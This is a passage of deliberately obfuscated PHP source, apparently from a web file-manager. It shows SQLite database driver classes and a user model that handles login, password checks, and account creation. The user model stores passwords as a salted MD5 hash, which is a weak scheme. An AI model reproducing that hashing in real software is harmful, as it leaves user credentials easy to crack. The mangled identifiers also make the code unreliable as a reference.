(!isset($this->linkID[$é¨çÀ«—])) { if (empty($¾§àÅæ‹)) { $¾§àÅæ‹ = $this->config; } $­¼£¨á  = !empty($¾§àÅæ‹[$Õ¨¬¾éş[17]][$Õ¨¬¾éş[18]]) ? $¾§àÅæ‹[$Õ¨¬¾éş[17]][$Õ¨¬¾éş[18]] : $this->pconnect; $ÁŞ˜ = $­¼£¨á  ? $Õ¨¬¾éş[19] : $Õ¨¬¾éş[20]; $this->linkID[$é¨çÀ«—] = $ÁŞ˜($¾§àÅæ‹[$Õ¨¬¾éş[21]], $¾§àÅæ‹[$Õ¨¬¾éş[16]]); if (!$this->linkID[$é¨çÀ«—]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$é¨çÀ«—], 30000); if (1 != think_config($Õ¨¬¾éş[22])) { unset($this->config); } } return $this->linkID[$é¨çÀ«—]; } public function free() { $this->queryID = null; } public function query($¹™Çî”) { $‰ùàÑÕ  =& $_SERVER[®»±”ó²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¹™Çî”; if ($this->queryID) { $this->free(); } think_action_status($‰ùàÑÕ [23], 1); think_status($‰ùàÑÕ [24]); $this->queryID = sqlite_query($this->_linkID, $¹™Çî”); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÖÓõù”Ñ = $this->getAll(); return $ÖÓõù”Ñ; } } public function execute($±î²ë£ö) { $Ìß×’ÌØ =& $_SERVER[®»±”ó²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±î²ë£ö; if ($this->queryID) { $this->free(); } think_action_status($Ìß×’ÌØ[25], 1); think_status($Ìß×’ÌØ[24]); $‰´ÉÎ„• = sqlite_exec($this->_linkID, $±î²ë£ö); $this->debug(); if (!1 === $‰´ÉÎ„•) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[®»±”ó²][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÇÂõ´é÷ = sqlite_query($this->_linkID, $_SERVER[®»±”ó²][27]); if (!$ÇÂõ´é÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Û–´ŠĞÉ = sqlite_query($this->_linkID, $_SERVER[®»±”ó²][28]); if (!$Û–´ŠĞÉ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ı¡ä­Î = array(); if ($this->numRows > 0) { for ($ÔÎñ‚­ = 0; $ÔÎñ‚­ < $this->numRows; $ÔÎñ‚­++) { $ı¡ä­Î[$ÔÎñ‚­] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ı¡ä­Î; } public function getFields($¶ş÷äˆÜ) { $¾ü«ËÆú =& $_SERVER[®»±”ó²]; $ü„“ÉÃ‡ = $this->query($¾ü«ËÆú[29] . $¶ş÷äˆÜ . $¾ü«ËÆú[30]); $¢ôıÖâè = array(); if ($ü„“ÉÃ‡) { foreach ($ü„“ÉÃ‡ as $è¹ö‹ôî => $ˆÛóØÚ·) { $¢ôıÖâè[$ˆÛóØÚ·[$¾ü«ËÆú[31]]] = array($¾ü«ËÆú[32] => $ˆÛóØÚ·[$¾ü«ËÆú[31]], $¾ü«ËÆú[33] => $ˆÛóØÚ·[$¾ü«ËÆú[34]], $¾ü«ËÆú[35] => (bool) ($ˆÛóØÚ·[$¾ü«ËÆú[36]] === $¾ü«ËÆú[12]), $¾ü«ËÆú[37] => $ˆÛóØÚ·[$¾ü«ËÆú[38]], $¾ü«ËÆú[39] => strtolower($ˆÛóØÚ·[$¾ü«ËÆú[40]]) == $¾ü«ËÆú[41], $¾ü«ËÆú[42] => strtolower($ˆÛóØÚ·[$¾ü«ËÆú[43]]) == $¾ü«ËÆú[44]); } } return $¢ôıÖâè; } public function getTables($§ªö× İ = '') { $‘ãŠÑó =& $_SERVER[®»±”ó²]; $âòâÈ•ë = $this->query($‘ãŠÑó[45] . $‘ãŠÑó[46] . $‘ãŠÑó[47]); $‹ìÚªÎÚ = array(); foreach ($âòâÈ•ë as $Ø£Ğëüş => $•è©ø) { $‹ìÚªÎÚ[$Ø£Ğëüş] = current($•è©ø); } return $‹ìÚªÎÚ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‘æö “© =& $_SERVER[®»±”ó²]; $‘†¹ìÛ = sqlite_last_error($this->_linkID); $this->error = $‘†¹ìÛ . $‘æö “©[4] . sqlite_error_string($‘†¹ìÛ); if ($‘æö “©[12] != $this->queryStr) { $this->error .= LNG($‘æö “©[48]) . $this->queryStr; } think_trace($this->error, $‘æö “©[12], $‘æö “©[49]); return $this->error; } public function escapeString($µæ‘Ü›ğ) { return sqlite_escape_string($µæ‘Ü›ğ); } public function parseLimit($ø…ºùĞû) { $ªŞ¦…Ì =& $_SERVER[®»±”ó²]; $ªÌ»ôÍ = $ªŞ¦…Ì[12]; if (!empty($ø…ºùĞû)) { $ø…ºùĞû = explode($ªŞ¦…Ì[50], $ø…ºùĞû); if (count($ø…ºùĞû) > 1) { $ªÌ»ôÍ .= $ªŞ¦…Ì[51] . $ø…ºùĞû[1] . $ªŞ¦…Ì[52] . $ø…ºùĞû[0] . $ªŞ¦…Ì[53]; } else { $ªÌ»ôÍ .= $ªŞ¦…Ì[51] . $ø…ºùĞû[0] . $ªŞ¦…Ì[53]; } } return $ªÌ»ôÍ; } } class DbSqlite3Base extends Db { public function __construct($ÚŸÔ„‰® = '') { $Üğª•Êº =& $_SERVER[®»±”ó²]; if (!class_exists($Üğª•Êº[54])) { think_exception(think_lang($Üğª•Êº[14]) . $Üğª•Êº[55]); } if (!empty($ÚŸÔ„‰®)) { if (!isset($ÚŸÔ„‰®[$Üğª•Êº[16]])) { $ÚŸÔ„‰®[$Üğª•Êº[16]] = 438; } $this->config = $ÚŸÔ„‰®; if (empty($this->config[$Üğª•Êº[17]])) { $this->config[$Üğª•Êº[17]] = array(); } } } public function connect($°¯§ûç = '', $é´±ä = 0) { $Û†Ï•¼ =& $_SERVER[®»±”ó²]; if (!isset($this->linkID[$é´±ä])) { if (empty($°¯§ûç)) { $°¯§ûç = $this->config; } $this->linkID[$é´±ä] = new SQLite3($°¯§ûç[$Û†Ï•¼[21]]); if (!$this->linkID[$é´±ä]) { think_exception($this->linkID[$é´±ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$é´±ä]->busyTimeout(30000); if (1 != think_config($Û†Ï•¼[22])) { unset($this->config); } } return $this->linkID[$é´±ä]; } public function free() { $this->queryID = null; } public function query($‰‰í©‹Ê) { $¹ÏÏ˜¹ =& $_SERVER[®»±”ó²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‰‰í©‹Ê; if ($this->queryID) { $this->free(); } think_action_status($¹ÏÏ˜¹[23], 1); think_status($¹ÏÏ˜¹[24]); $this->queryID = $this->_linkID->query($‰‰í©‹Ê); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $††Ğ«©ú = $this->getAll(); $this->numRows = count($††Ğ«©ú); return $††Ğ«©ú; } } public function execute($¼Œê²ç›) { $åÀ³·ŸÛ =& $_SERVER[®»±”ó²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¼Œê²ç›; if ($this->queryID) { $this->free(); } think_action_status($åÀ³·ŸÛ[25], 1); think_status($åÀ³·ŸÛ[24]); $ØÊş§Ä‰ = $this->_linkID->exec($¼Œê²ç›); $this->debug(); if (!1 === $ØÊş§Ä‰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[®»±”ó²][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $›ï£Ü = $this->_linkID->query($_SERVER[®»±”ó²][27]); if (!$›ï£Ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÜÁÅõÖ = $this->_linkID->query($_SERVER[®»±”ó²][28]); if (!$ÜÁÅõÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $æ¿¡« = array(); while ($¤£æô›² = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $æ¿¡«[] = $¤£æô›²; } $this->queryID->reset(); return $æ¿¡«; } public function getFields($—¡î‘·¶) { $…ä¶¦Ï‘ =& $_SERVER[®»±”ó²]; $·×¥µ˜¥ = $this->query($…ä¶¦Ï‘[29] . $—¡î‘·¶ . $…ä¶¦Ï‘[30]); $ÏÔøµß = array(); if ($·×¥µ˜¥) { foreach ($·×¥µ˜¥ as $¢ÖïˆĞÜ => $êƒ¶ÎïĞ) { $ÏÔøµß[$êƒ¶ÎïĞ[$…ä¶¦Ï‘[32]]] = array($…ä¶¦Ï‘[32] => $êƒ¶ÎïĞ[$…ä¶¦Ï‘[32]], $…ä¶¦Ï‘[33] => $êƒ¶ÎïĞ[$…ä¶¦Ï‘[33]], $…ä¶¦Ï‘[35] => (bool) ($êƒ¶ÎïĞ[$…ä¶¦Ï‘[35]] === $…ä¶¦Ï‘[12]), $…ä¶¦Ï‘[37] => $êƒ¶ÎïĞ[$…ä¶¦Ï‘[56]], $…ä¶¦Ï‘[39] => (bool) $êƒ¶ÎïĞ[$…ä¶¦Ï‘[57]], $…ä¶¦Ï‘[42] => (bool) $êƒ¶ÎïĞ[$…ä¶¦Ï‘[57]]); } } return $ÏÔøµß; } public function getTables($“ö™¡ñÀ = '') { $ªªšÎ½˜ =& $_SERVER[®»±”ó²]; $§™ŠıàØ = $this->query($ªªšÎ½˜[45] . $ªªšÎ½˜[46] . $ªªšÎ½˜[47]); $òøÄÂ‰Ã = array(); foreach ($§™ŠıàØ as $¨ÇÙÔˆ => $ŞÎ“Á…) { $òøÄÂ‰Ã[$¨ÇÙÔˆ] = current($ŞÎ“Á…); } return $òøÄÂ‰Ã; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Êé¨ÌŠ =& $_SERVER[®»±”ó²]; $this->error = $this->_linkID->lastErrorMsg(); if ($Êé¨ÌŠ[12] != $this->queryStr) { $this->error .= LNG($Êé¨ÌŠ[48]) . $this->queryStr; } think_trace($this->error, $Êé¨ÌŠ[12], $Êé¨ÌŠ[49]); return $this->error; } public function escapeString($öÜğÊãû) { $¢¥›êÓİ =& $_SERVER[®»±”ó²]; if ($this->_linkID) { return $this->_linkID->escapeString($öÜğÊãû); } return str_ireplace($¢¥›êÓİ[58], $¢¥›êÓİ[59], $öÜğÊãû); } public function parseLimit($»µ·ÔÌİ) { $ºşŒ·Ï£ =& $_SERVER[®»±”ó²]; $”€«„ = $ºşŒ·Ï£[12]; if (!empty($»µ·ÔÌİ)) { $»µ·ÔÌİ = explode($ºşŒ·Ï£[50], $»µ·ÔÌİ); if (count($»µ·ÔÌİ) > 1) { $”€«„ .= $ºşŒ·Ï£[51] . $»µ·ÔÌİ[1] . $ºşŒ·Ï£[52] . $»µ·ÔÌİ[0] . $ºşŒ·Ï£[53]; } else { $”€«„ .= $ºşŒ·Ï£[51] . $»µ·ÔÌİ[0] . $ºşŒ·Ï£[53]; } } return $”€«„; } } goto Dâ„ø¸˜ö‹; f‹²ƒ¼ïËÂ: class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\x65" => "\x75\x73\x65\162\137\x6d\145\x74\x61", "\x6d\145\x74\141\x46\151\145\154\x64" => "\165\163\x65\x72\x49\104"); protected $simpleField = "\165\163\145\162\111\x44\54\156\151\143\153\116\141\x6d\145\54\x6e\141\x6d\145\54\141\x76\x61\x74\x61\x72\x2c\x73\x65\x78\54\x73\164\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ğ±å´œá) { $Ü¾ğ´·È =& $_SERVER[®»±”ó²]; $½öÌ ² = $Ü¾ğ´·È[2486]; return array($Ü¾ğ´·È[2073] => array($Ğ±å´œá[0], $½öÌ ²), $Ü¾ğ´·È[2075] => array($Ğ±å´œá[0], $½öÌ ²), $Ü¾ğ´·È[2487] => array($Ğ±å´œá[0], $½öÌ ²)); } protected function getInfo($–ë¹í‚ü, $ñ°ÎöŒÍ = false) { $¡Î±ÉËÉ = $this->getInfoSimple($–ë¹í‚ü); if (!is_array($¡Î±ÉËÉ)) { return array(); } if ($ñ°ÎöŒÍ) { return $this->_getInfoApply($¡Î±ÉËÉ); } return $this->cacheFunctionGet($_SERVER[®»±”ó²][2077], $–ë¹í‚ü); } protected function getInfoFull($—ÀÎÉ€½, $»©Ä…å = false) { $Å€úâ = $this->getInfoSimple($—ÀÎÉ€½); if (!is_array($Å€úâ)) { return array(); } if ($»©Ä…å) { return $this->_getInfoApply($Å€úâ, !0); } return $this->cacheFunctionGet($_SERVER[®»±”ó²][2488], $—ÀÎÉ€½); } private function _getInfoApply($‹™›¢‡«, $ŒÜØóñ = false) { $Â˜Ä©‰ =& $_SERVER[®»±”ó²]; if (!$‹™›¢‡«) { return $‹™›¢‡«; } $€¹çÃ² = md5($Â˜Ä©‰[2489] . $‹™›¢‡«[$Â˜Ä©‰[976]] . $Â˜Ä©‰[2490] . $‹™›¢‡«[$Â˜Ä©‰[32]]); $‹™›¢‡« = $this->_listDataApplyItem($‹™›¢‡«); $œêîª® = Model($Â˜Ä©‰[1440])->metaGet($‹™›¢‡«[$Â˜Ä©‰[90]][$Â˜Ä©‰[194]]); $‹™›¢‡«[$Â˜Ä©‰[2491]] = $€¹çÃ²; $‹™›¢‡«[$Â˜Ä©‰[90]][$Â˜Ä©‰[2275]] = isset($œêîª®[$Â˜Ä©‰[2276]]) ? $œêîª®[$Â˜Ä©‰[2276]] : null; if ($ŒÜØóñ) { $‹™›¢‡«[$Â˜Ä©‰[552]] = $this->metaGet($‹™›¢‡«[$Â˜Ä©‰[1791]]); } return $‹™›¢‡«; } protected function getInfoSimple($¹…è‹Š, $½œ€í¥ = false) { $¿ßÖó÷ =& $_SERVER[®»±”ó²]; if (!$¹…è‹Š) { return array(); } if ($½œ€í¥) { $€ÓÁÛè« = $this->where(array($¿ßÖó÷[1791] => intval($¹…è‹Š)))->find(); if (!is_array($€ÓÁÛè«)) { return array(); } $€ÓÁÛè«[$¿ßÖó÷[2492]] = Action($¿ßÖó÷[2493])->parseUrl($€ÓÁÛè«[$¿ßÖó÷[2492]]); return $€ÓÁÛè«; } return $this->cacheFunctionGet($¿ßÖó÷[2078], $¹…è‹Š); } protected function getInfoSimpleOuter($­ı¨šÖ») { $ªîğŠÑ =& $_SERVER[®»±”ó²]; if (!$­ı¨šÖ» || $­ı¨šÖ» == 0) { return array($ªîğŠÑ[1791] => $ªîğŠÑ[231], $ªîğŠÑ[32] => $ªîğŠÑ[176] . LNG($ªîğŠÑ[2494]) . $ªîğŠÑ[178], $ªîğŠÑ[2492] => STATIC_PATH . $ªîğŠÑ[2495]); } $Ê¦•ñºæ = $this->cacheFunctionGet($ªîğŠÑ[2078], $­ı¨šÖ»); $»ÈâÆ× = array_field_key($Ê¦•ñºæ, explode($ªîğŠÑ[50], $this->simpleField)); if (!$»ÈâÆ×) { return array($ªîğŠÑ[1791] => $ªîğŠÑ[1285], $ªîğŠÑ[32] => $ªîğŠÑ[176] . LNG($ªîğŠÑ[2496]) . $ªîğŠÑ[178], $ªîğŠÑ[2492] => STATIC_PATH . $ªîğŠÑ[2497]); } $»ÈâÆ×[$ªîğŠÑ[2492]] = Action($ªîğŠÑ[2493])->parseUrl($»ÈâÆ×[$ªîğŠÑ[2492]]); return $»ÈâÆ×; } protected function groupUser($ğÊóş˜Å) { } public static function errorLang($¶¹’åšŞ) { $µ”§”Şí =& $_SERVER[®»±”ó²]; $ÑÙñ“ê = array(self::ERROR_USER_NOT_EXISTS => $µ”§”Şí[2498], self::ERROR_USER_PASSWORD_ERROR => $µ”§”Şí[2499], self::ERROR_USER_EXIST_NAME => $µ”§”Şí[2500], self::ERROR_USER_EXIST_PHONE => $µ”§”Şí[2501], self::ERROR_USER_EXIST_EMAIL => $µ”§”Şí[2502], self::ERROR_USER_LOGIN_LOCK => $µ”§”Şí[2503], self::ERROR_IP_NOT_ALLOW => $µ”§”Şí[2504], self::ERROR_USER_EXIST_NICKNAME => $µ”§”Şí[2505]); $ß”––­ó = LNG($ÑÙñ“ê[$¶¹’åšŞ]); if ($¶¹’åšŞ == self::ERROR_USER_LOGIN_LOCK) { $İÚ¯ê³– = (int) Model($µ”§”Şí[1396])->get($µ”§”Şí[2506]); if ($İÚ¯ê³– > 60) { $ß”––­ó = str_replace($µ”§”Şí[91], ceil($İÚ¯ê³– / 60), $ß”––­ó); } } return $ß”––­ó; } protected function metaSet($§¯ĞÀÌ—, $“¿Ü«§„ = null, $ÒçûŸÓ = null) { $this->clearCache($§¯ĞÀÌ—); return parent::metaSet($§¯ĞÀÌ—, $“¿Ü«§„, $ÒçûŸÓ); } public function getInfoByMeta($¼Êè’½ü, $»ÔÙ‚¿Ë) { $Ã¯¿ÃÂİ =& $_SERVER[®»±”ó²]; $ùöÈåó = Model($Ã¯¿ÃÂİ[2507])->where(array($Ã¯¿ÃÂİ[97] => $¼Êè’½ü, $Ã¯¿ÃÂİ[452] => $»ÔÙ‚¿Ë))->find(); if ($ùöÈåó) { return $this->getInfo($ùöÈåó[$Ã¯¿ÃÂİ[1791]]); } return !1; } public function userLoginCheck($©‘¬×—‰, $¦™¼ü, $£ŒÊÊ®Ú = false) { $›è¡ä =& $_SERVER[®»±”ó²]; $Ùƒ¢Ê—› = $this->userLoginFind($©‘¬×—‰); if (!$Ùƒ¢Ê—›) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ùƒ¢Ê—›[$›è¡ä[1791]], $¦™¼ü)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $£ŒÊÊ®Ú ? $this->getInfoFull($Ùƒ¢Ê—›[$›è¡ä[1791]]) : $this->getInfo($Ùƒ¢Ê—›[$›è¡ä[1791]]); } public function userLoginFind($û×¥£ˆ¾) { $ˆ§ÂØÂµ =& $_SERVER[®»±”ó²]; $÷»ú‹Ñ = array($ˆ§ÂØÂµ[32] => $û×¥£ˆ¾, $ˆ§ÂØÂµ[2288] => $û×¥£ˆ¾, $ˆ§ÂØÂµ[382] => $û×¥£ˆ¾, $ˆ§ÂØÂµ[2508] => $û×¥£ˆ¾, $ˆ§ÂØÂµ[1087] => $ˆ§ÂØÂµ[1089]); if ($this->nickNameRpt()) { unset($÷»ú‹Ñ[$ˆ§ÂØÂµ[2288]]); } return $this->where($÷»ú‹Ñ)->find(); } public function clearCache($æŸ¾íê†) { $Şõ÷Ä² =& $_SERVER[®»±”ó²]; $this->cacheFunctionClear($Şõ÷Ä²[2077], $æŸ¾íê†); $this->cacheFunctionClear($Şõ÷Ä²[2078], $æŸ¾íê†); $this->cacheFunctionClear($Şõ÷Ä²[2488], $æŸ¾íê†); } public function userPasswordCheck($¾²œÍË‰, $‚ÔîÉüø) { $‹ÂŒå­Í =& $_SERVER[®»±”ó²]; $öÀÍÃÍŒ = $this->where(array($‹ÂŒå­Í[1791] => intval($¾²œÍË‰)))->find(); $’íıÅ”Ó = $this->metaGet($¾²œÍË‰); $Ší¬Ë¬Ñ = isset($’íıÅ”Ó[$‹ÂŒå­Í[2509]]) ? $’íıÅ”Ó[$‹ÂŒå­Í[2509]] : $‹ÂŒå­Í[12]; if (md5($Ší¬Ë¬Ñ . trim($‚ÔîÉüø)) !== $öÀÍÃÍŒ[$‹ÂŒå­Í[976]]) { return !1; } return !0; } public function userAdd($ÏØ…Áª) { $óÉşƒ =& $_SERVER[®»±”ó²]; $£…Âì¸‘ = array($óÉşƒ[505] => $ÏØ…Áª[$óÉşƒ[32]], $óÉşƒ[2510] => $ÏØ…Áª[$óÉşƒ[2199]], $óÉşƒ[2511] => isset($ÏØ…Áª[$óÉşƒ[382]]) ? $ÏØ…Áª[$óÉşƒ[382]] : $óÉşƒ[12], $óÉşƒ[2512] => isset($ÏØ…Áª[$óÉşƒ[2508]]) ? $ÏØ…Áª[$óÉşƒ[2508]] : $óÉşƒ[12], $óÉşƒ[2513] => isset($ÏØ…Áª[$óÉşƒ[2288]]) ? $ÏØ…Áª[$óÉşƒ[2288]] : $ÏØ…Áª[$óÉşƒ[32]], $óÉşƒ[2514] => isset($ÏØ…Áª[$óÉşƒ[2492]]) ? $ÏØ…Áª[$óÉşƒ[2492]] : $óÉşƒ[12], $óÉşƒ[2515] => isset($ÏØ…Áª[$óÉşƒ[2516]]) ? $ÏØ…Áª[$óÉşƒ[2516]] : 1, $óÉşƒ[2517] => $ÏØ…Áª[$óÉşƒ[976]], $óÉşƒ[2079] => isset($ÏØ…Áª[$óÉşƒ[1978]]) ? $ÏØ…Áª[$óÉşƒ[1978]] : 1024 * 1024 * 20, $óÉşƒ[2080] => 0, $óÉşƒ[2518] => 0, $óÉşƒ[2124] => isset($ÏØ…Áª[$óÉşƒ[830]]) ? $ÏØ…Áª[$óÉşƒ[830]] : 1); if (!empty($ÏØ…Áª[$óÉşƒ[1791]])) { $£…Âì¸‘[$óÉşƒ[1791]] = $ÏØ…Áª[$óÉşƒ[1791]]; } $ÆµÜƒ»× = $this->_checkExist($ÏØ…Áª); if ($ÆµÜƒ»× !== !0) { return $ÆµÜƒ»×; } if (!empty($£…Âì¸‘[$óÉşƒ[2492]]) && strlen($£…Âì¸‘[$óÉşƒ[2492]]) > 255) { $£…Âì¸‘[$óÉşƒ[2492]] = $óÉşƒ[12]; } $Íã×ã = $this->add($£…Âì¸‘); $”÷Î™¡ = array($óÉşƒ[2517] => $£…Âì¸‘[$óÉşƒ[976]], $óÉşƒ[2513] => $£…Âì¸‘[$óÉşƒ[2288]], $óÉşƒ[2519] => $ÏØ…Áª[$óÉşƒ[2084]]); $this->userEdit($Íã×ã, $”÷Î™¡); Model($óÉşƒ[1440])->userRootAdd($Íã×ã); return $Íã×ã; } protected function userEditTest($”æÙ–ÇÛ, $Íú¯âÍ´) { return $this->call($_SERVER[®»±”ó²][2520], $”æÙ–ÇÛ, $Íú¯âÍ´); } protected function userEdit($×ÈàÑÔı, $æƒ·é¹Ù) { $†×Ñ•¯‘ =& $_SERVER[®»±”ó²]; $±×åê¤ = $this->getInfoSimple($×ÈàÑÔı); if (!$±×åê¤) { return !1; } $Û®Ä‚äš = $this->_checkExist($æƒ·é¹Ù, $×ÈàÑÔı); if ($Û®Ä‚äš !== !0) { return $Û®Ä‚äš; } if (isset($æƒ·é¹Ù[$†×Ñ•¯‘[976]]) && trim($æƒ·é¹Ù[$†×Ñ•¯‘[976]]) != $†×Ñ•¯‘[12]) { $Í½›­‰‰ = $this->metaGet($×ÈàÑÔı); if (empty($Í½›­‰‰[$†×Ñ•¯‘[2509]])) { $Í½›­‰‰[$†×Ñ•¯‘[2509]] = rand_string(10); Model($†×Ñ•¯‘[590])->metaSet($×ÈàÑÔı, $†×Ñ•¯‘[2509], $Í½›­‰‰[$†×Ñ•¯‘[2509]]); } $æƒ·é¹Ù[$†×Ñ•¯‘[976]] = md5($Í½›­‰‰[$†×Ñ•¯‘[2509]] . trim($æƒ·é¹Ù[$†×Ñ•¯‘[976]])); } else { unset($æƒ·é¹Ù[$†×Ñ•¯‘[976]]); } if (!empty($æƒ·é¹Ù[$†×Ñ•¯‘[2492]]) && strlen($æƒ·é¹Ù[$†×Ñ•¯‘[2492]]) > 255) { $æƒ·é¹Ù[$†×Ñ•¯‘[2492]] = $†×Ñ•¯‘[12]; } if (isset($æƒ·é¹Ù[$†×Ñ•¯‘[2288]])) { $this->setNamePinyin($×ÈàÑÔı, $æƒ·é¹Ù[$†×Ñ•¯‘[2288]]); } if (isset($æƒ·é¹Ù[$†×Ñ•¯‘[2084]])) { $ëáşáà÷ = $†×Ñ•¯‘[1399] . $×ÈàÑÔı; $ñæŸéé = $†×Ñ•¯‘[1397]; $ˆÊ»àóõ = $æƒ·é¹Ù[$†×Ñ•¯‘[2084]] ? $æƒ·é¹Ù[$†×Ñ•¯‘[2084]] : $†×Ñ•¯‘[12]; $‘Ğµã­® = Model($†×Ñ•¯‘[1396])->get($ëáşáà÷, $ñæŸéé); $‘Ğµã­® = $‘Ğµã­® ? $‘Ğµã­® : $†×Ñ•¯‘[12]; if ($‘Ğµã­® != $ˆÊ»àóõ) { if (!$ˆÊ»àóõ && $‘Ğµã­®) { Model($†×Ñ•¯‘[1396])->remove($ëáşáà÷, $ñæŸéé); } else { if ($ˆÊ»àóõ) { Model($†×Ñ•¯‘[1396])->set($ëáşáà÷, $ˆÊ»àóõ, $ñæŸéé); } } } unset($æƒ·é¹Ù[$†×Ñ•¯‘[2084]]); Model($†×Ñ•¯‘[610])->metaSet($×ÈàÑÔı, $†×Ñ•¯‘[2084], $ˆÊ»àóõ); } if (empty($æƒ·é¹Ù)) { return !0; } $this->where(array($†×Ñ•¯‘[1782] => $×ÈàÑÔı))->save($æƒ·é¹Ù); $this->clearCache($×ÈàÑÔı); return !0; } public function setNamePinyin($Ã¦áí™, $±”¹­ç« = false) { $ãÖë€›Á =& $_SERVER[®»±”ó²]; if (!$±”¹­ç«) { $Ç¼‰…‚£ = $this->getInfoSimple($Ã¦áí™); $±”¹­ç« = $Ç¼‰…‚£[$ãÖë€›Á[2288]] ? $Ç¼‰…‚£[$ãÖë€›Á[2288]] : $Ç¼‰…‚£[$ãÖë€›Á[32]]; } $¹Šşõ“ = Model($ãÖë€›Á[610]); if (!Input::check($±”¹­ç«, $ãÖë€›Á[671])) { return $¹Šşõ“->metaSet($Ã¦áí™, array($ãÖë€›Á[549] => $ãÖë€›Á[12], $ãÖë€›Á[548] => $ãÖë€›Á[12])); } return $¹Šşõ“->metaSet($Ã¦áí™, array($ãÖë€›Á[549] => str_replace($ãÖë€›Á[53], $ãÖë€›Á[12], Pinyin::get($±”¹­ç«)), $ãÖë€›Á[548] => Pinyin::get($±”¹­ç«, $ãÖë€›Á[672]))); } private function nickNameRpt() { $í£Õúñ =& $_SERVER[®»±”ó²]; $Ÿµ‡ÌÀ‹ = Model($í£Õúñ[851])->get($í£Õúñ[2521]); $ùÓÂ»ñ— = $GLOBALS[$í£Õúñ[6]][$í£Õúñ[459]][$í£Õúñ[2521]]; $õ¾ÑÄ = !is_null($Ÿµ‡ÌÀ‹) ? $Ÿµ‡ÌÀ‹ : $ùÓÂ»ñ—; return !!$õ¾ÑÄ; } private function _checkExist($é¦ÛËĞ, $şÆê¹ = false) { $”âåÚš =& $_SERVER[®»±”ó²]; $ä¹¼ßø‡ = array($”âåÚš[32] => UserModel::ERROR_USER_EXIST_NAME, $”âåÚš[2288] => UserModel::ERROR_USER_EXIST_NICKNAME, $”âåÚš[382] => UserModel::ERROR_USER_EXIST_EMAIL, $”âåÚš[2508] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ä¹¼ßø‡[$”âåÚš[2288]]); } $ï½Úµ¾ = $şÆê¹ ? array($”âåÚš[1791] => array($”âåÚš[2522], $şÆê¹)) : array(); foreach ($ä¹¼ßø‡ as $‡ëä¦Öç => $ù®çÌÕï) { $¾ÁªŸ« = array(); foreach ($ä¹¼ßø‡ as $ê¥Œ½“á => $øİÊê¦) { if (isset($é¦ÛËĞ[$ê¥Œ½“á]) && $é¦ÛËĞ[$ê¥Œ½“á]) { $¾ÁªŸ«[] = $é¦ÛËĞ[$ê¥Œ½“á]; } } if (!$¾ÁªŸ«) { continue; } $÷œ¨°¶å = array_merge(array($‡ëä¦Öç => array($”âåÚš[7], $¾ÁªŸ«)), $ï½Úµ¾); $„¤ß„• = $this->where($÷œ¨°¶å)->find(); if ($„¤ß„•) { return $ù®çÌÕï; } } return !0; } public function userListInfo($•ñˆî¦) { $ØÕ‚Â»ê =& $_SERVER[®»±”ó²]; $ŠçÃ¢©Æ = array(); $•ñˆî¦ = is_array($•ñˆî¦) ? array_unique($•ñˆî¦) : array(); if (!$•ñˆî¦) { return $ŠçÃ¢©Æ; } if (count($•ñˆî¦) < 20) { foreach ($•ñˆî¦ as $ßèÑºĞã) { $ŠçÃ¢©Æ[$ßèÑºĞã . $ØÕ‚Â»ê[12]] = $this->getInfoSimpleOuter($ßèÑºĞã); } } else { $ÎËÏ‰ = array($ØÕ‚Â»ê[1782] => array($ØÕ‚Â»ê[503], $•ñˆî¦)); if (count($•ñˆî¦) == 1) { $ÎËÏ‰ = array($ØÕ‚Â»ê[1782] => $•ñˆî¦[0]); } $°²©½¿ú = Model($ØÕ‚Â»ê[590])->field($this->simpleField)->where($ÎËÏ‰)->select(); $°²©½¿ú = array_to_keyvalue($°²©½¿ú, $ØÕ‚Â»ê[1791]); foreach ($•ñˆî¦ as $ßèÑºĞã) { $âèı†úı = $°²©½¿ú[$ßèÑºĞã]; if (!$âèı†úı) { $ŠçÃ¢©Æ[$ßèÑºĞã . $ØÕ‚Â»ê[12]] = 